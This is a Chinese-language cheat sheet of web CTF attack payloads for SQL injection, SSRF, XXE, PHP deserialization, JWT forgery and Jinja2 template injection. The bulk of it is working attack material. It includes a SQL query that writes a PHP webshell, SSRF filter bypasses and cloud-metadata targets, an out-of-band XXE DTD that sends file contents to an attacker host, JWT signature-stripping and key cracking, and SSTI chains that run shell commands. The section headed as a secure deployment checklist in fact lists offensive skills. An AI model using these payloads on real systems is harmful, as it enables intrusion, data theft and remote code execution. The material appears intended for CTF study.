# Web CTF 考点速查：SSRF / XXE / 反序列化 / JWT

> **📘 文档定位**：CTF Web 方向核心考点速查 | 难度：⭐⭐⭐ | 预计阅读：30 分钟
> 系统梳理 Web CTF 中 SQL 注入、SSRF、XXE、反序列化、JWT、SSTI 等高频考点的攻击手法与 Payload 速查。

---

## 导航目录

- [一、SQL 注入速查](#一sql-注入)
- [二、SSRF 利用](#二ssrf)
- [三、XXE 利用](#三xxe)
- [四、PHP 反序列化](#四php-反序列化)
- [五、JWT 攻击](#五jwt)
- [六、SSTI 模板注入](#六ssti)
- [七、经典 CTF 题目](#七经典题目)
- [八、安全部署 Checklist](#八安全部署-checklist)
- [九、高分考点与知识巧记](#九高分考点与知识巧记)

---

## 一、SQL 注入

### 1.1 CTF 常用速查

```sql
-- 1. 联合查询 → 判断列数
ORDER BY 3 -- 

-- 2. 查数据库
UNION SELECT 1,database(),3 -- 

-- 3. 查表名(MySQL)
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 

-- 4. 查列名
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='表名' -- 

-- 5. 没有回显 → 盲注
AND (SELECT ascii(substr(database(),1,1)))>100 -- 

-- 6. 写文件 GetShell
UNION SELECT 1,'<?php eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/shell.php' -- 

-- 7. 堆叠注入(多条语句)
;show tables; -- (select被过滤时)
;handler table_name open;handler table_name read first; -- (无select时)
;set @sql=0x53454c454354202a2046524f4d207573657273;prepare s from @sql;execute s; -- (预编译绕过过滤)
```

### 1.2 SQL 注入分类对比

| 类型 | 特点 | 典型场景 | 难度 |
|:---|:---|:---|:---:|
| 联合查询注入 | 有回显，直接 UNION | 最常见的 CTF 题型 | ⭐⭐ |
| 布尔盲注 | 无回显，通过真假判断 | WAF 拦截回显 | ⭐⭐⭐ |
| 时间盲注 | 无回显，通过延迟判断 | 最隐蔽 | ⭐⭐⭐ |
| 堆叠注入 | 可执行多条语句 | 需要特定数据库支持 | ⭐⭐⭐ |
| 二次注入 | 先存储后触发 | 注册/修改资料功能 | ⭐⭐⭐⭐ |

> **🔑 高分考点**：information_schema 是 MySQL 注入的核心，需熟记 tables/columns 表结构。

---

## 二、SSRF

### 2.1 IP 格式绕过大全

```bash
# 1. URL 绕过
http://127.0.0.1/flag     → 过滤了！
http://0177.0.0.1/flag    → 八进制绕过 ✓
http://2130706433/flag     → 十进制绕过 ✓
http://0x7f000001/flag     → 十六进制绕过 ✓
http://127.0.0.1.xip.io/flag → DNS绕过 ✓

# 2. 302 跳转绕过
# 自己的服务器返回302 → http://127.0.0.1/admin

# 3. gopher 协议(内网攻击)
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a

# 4. dict 协议(端口探测)
dict://127.0.0.1:3306/

# 5. file 协议(读文件)
file:///flag
file:///etc/passwd
```

### 2.2 SSRF 攻击目标

| 目标 | 协议 | Payload 示例 |
|:---|:---|:---|
| Redis | gopher | `gopher://127.0.0.1:6379/_*1...` |
| MySQL | gopher | 构造认证握手包 |
| FastCGI | gopher | 构造 FCGI 请求 |
| Cloud Metadata | http | `http://169.254.169.254/` |
| 本地文件 | file | `file:///etc/passwd` |

> **💡 知识巧记**：SSRF 绕过 IP 黑名单的口诀："八进十进十六进，DNS 重绑定和 302 跳转。"

---

## 三、XXE

### 3.1 基础与进阶 Payload

```xml
<!-- 基础文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>

<!-- 无回显 → OOB外带 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
  <!ENTITY % dtd SYSTEM "http://vps/evil.dtd"> %dtd;
]>
<root>1</root>

<!-- evil.dtd -->
<!ENTITY % a "<!ENTITY send SYSTEM 'http://vps/?%xxe;'>"> %a; %send;

<!-- CDATA绕过(无特殊字符时) -->
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % end "]]>">
  <!ENTITY all "%start;%file;%end;">
]>
<root>&all;</root>
```

### 3.2 XXE 利用场景

```
有回显 XXE：直接读取文件内容
盲 XXE：通过 OOB（Out-of-Band）外带数据
  → 构造外部 DTD → 将文件内容拼到 HTTP 请求中
  → 攻击者服务器日志中查看
SSRF 型 XXE：利用 XXE 访问内网资源
DoS 型 XXE：构造 Billion Laughs 攻击
```

---

## 四、PHP 反序列化

### 4.1 核心利用手法

```php
// 1. 基础反序列化
$data = unserialize($_GET['data']);
echo $data;  // 触发 __toString

// 2. Phar 反序列化(不直接调用 unserialize!)
// include('phar://uploads/avatar.jpg')
// file_exists('phar://...')  → 也会触发!

// 3. POP 链构造
class Start {
    public function __destruct() { $this->clean(); }
    public function clean() { eval($this->cmd); }
}
// Payload: O:5:"Start":1:{s:3:"cmd";s:10:"phpinfo();";}

// 4. 绕过 __wakeup
// 修改序列化字符串中的属性数量:
// O:5:"Start":2:{s:3:"cmd";s:10:"phpinfo();";}
// 实际只有1个属性，写2 → __wakeup 被跳过!

// 5. 字符逃逸(反序列化字符串变长)
// 过滤函数: str_replace('x','yy',$data)
// "x" → "yy" (1字符变2字符)
// 利用: 计算差值 → 构造逃逸
```

### 4.2 魔术方法触发顺序

| 方法 | 触发时机 | CTF 利用价值 |
|:---|:---|:---|
| `__wakeup` | unserialize 时 | ⭐⭐⭐⭐⭐ 最常见入口 |
| `__destruct` | 对象销毁时 | ⭐⭐⭐⭐⭐ 最常见入口 |
| `__toString` | 对象被当作字符串时 | ⭐⭐⭐⭐ 常见跳板 |
| `__get` | 读取不可访问属性 | ⭐⭐⭐ 常见跳板 |
| `__call` | 调用不存在方法 | ⭐⭐⭐ 常见跳板 |

> **🔑 高分考点**：POP Chain 构造三步法——找入口 → 找跳板 → 找终点（危险函数）。

---

## 五、JWT

### 5.1 JWT 结构

```
header.payload.signature
header: { "alg": "HS256", "typ": "JWT" }
payload: { "sub": "1", "name": "admin", "iat": ... }
```

### 5.2 攻击手法速查

```bash
# 1. 无签名 (alg:none)
{"alg":"none","typ":"JWT"}
{"user":"admin"}
.
# 去掉签名部分 → 直接发送!

# 2. 弱密钥爆破
hashcat -m 16500 jwt.txt rockyou.txt

# 3. 密钥泄露 → RS256→HS256 混淆
jwt_tool.py <TOKEN> -X k -pk public.pem

# 4. kid 注入
{"alg":"HS256","kid":"../../../../../etc/passwd"}
# → 服务器读取 /etc/passwd 作为密钥

# 5. 空密钥
{"alg":"HS256"} 密钥=""
```

### 5.3 JWT 攻击决策树

```
JWT Token 到手 → 检查 alg：
  ├─ none → 直接去掉签名
  ├─ HS256 → 爆破密钥 / kid 注入
  ├─ RS256 → 如果有公钥 → 尝试 HS256 混淆
  └─ 其他 → 查看 payload 敏感信息泄露
```

---

## 六、SSTI

### 6.1 Flask/Jinja2 SSTI

```python
# 1. 基础探测
{{7*7}}  # → 49 → SSTI 确认

# 2. 读取配置
{{config}}

# 3. RCE 链
# 方法1: __class__.__mro__ 链
{{''.__class__.__mro__[1].__subclasses__()}}
# → 找到 <class 'subprocess.Popen'> 或其他可用类

# 方法2: lipsum
{{lipsum.__globals__['os'].popen('cat /flag').read()}}

# 方法3: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# 方法4: joiner
{{joiner.__init__.__globals__.os.popen('cat /flag').read()}}

# 过滤绕过:
# . → |attr()
# [] → |attr()
# {{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}
```

### 6.2 多模板引擎对比

| 引擎 | 语言 | 探测 Payload | RCE 难度 |
|:---|:---|:---|:---:|
| Jinja2 | Python | `{{7*7}}` | ⭐⭐⭐ |
| Twig | PHP | `{{7*7}}` | ⭐⭐⭐ |
| EJS | Node.js | `<%= 7*7 %>` | ⭐⭐ |
| Pug/Jade | Node.js | `#{7*7}` | ⭐⭐ |
| FreeMarker | Java | `${7*7}` | ⭐⭐⭐ |
| Velocity | Java | `#set($x=7*7)$x` | ⭐⭐⭐ |

---

## 七、经典题目

### 7.1 CTF Web 经典题型汇总

```
PHP:
  ✦ 弱类型比较 (md5 碰撞 0e 开头)
  ✦ 反序列化 POP Chain
  ✦ preg_replace /e RCE
  ✦ extract 变量覆盖
  ✦ 文件包含 + php://filter

Java:
  ✦ Fastjson 反序列化
  ✦ Shiro RememberMe RCE
  ✦ JNDI 注入
  ✦ Spring Boot Actuator 信息泄露

Node.js:
  ✦ 原型链污染 (CVE-2019-10744等)
  ✦ ejs/eval 注入
  ✦ vm2 沙箱逃逸

Python:
  ✦ Flask SSTI
  ✦ pickle 反序列化
  ✦ yaml.load RCE

Go:
  ✦ template SSTI
  ✦ SSRF
```

---

## 安全部署 Checklist

- [ ] SQL 注入：Union/Boolean/Time/堆叠注入全部掌握
- [ ] SSRF：IP 格式绕过/gopher/file 协议熟练
- [ ] XXE：读文件/OOB 外带/CDATA 绕过
- [ ] PHP 反序列化：POP 链/Phar/wakeup 绕过
- [ ] JWT：none/爆破/混淆/kid 注入
- [ ] SSTI：Flask/Jinja2 RCE 链及过滤绕过
- [ ] 建立个人 Payload 速查库

## 高分考点与知识巧记

### 高分考点速查表

| 序号 | 考点 | 频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | SQL 联合查询注入 | ⭐⭐⭐⭐⭐ | ⭐⭐ | UNION SELECT + information_schema |
| 2 | SSRF IP 格式绕过 | ⭐⭐⭐⭐ | ⭐⭐ | 八进/十进/十六进/DNS |
| 3 | XXE OOB 外带 | ⭐⭐⭐⭐ | ⭐⭐⭐ | 外部 DTD + HTTP 请求 |
| 4 | PHP 反序列化 POP 链 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 找入口→跳板→终点 |
| 5 | JWT alg:none 攻击 | ⭐⭐⭐ | ⭐⭐ | 去掉签名部分直接发送 |
| 6 | SSTI RCE 链 | ⭐⭐⭐⭐ | ⭐⭐⭐ | `__class__.__mro__` 链 |

### 知识巧记口诀

> 🎵 SQL 注入查表名，SSRF 绕过用八进。XXE 外带靠 DTD，反序列化 POP 链行。JWT 没签直接送，SSTI 乘七先验证。

---
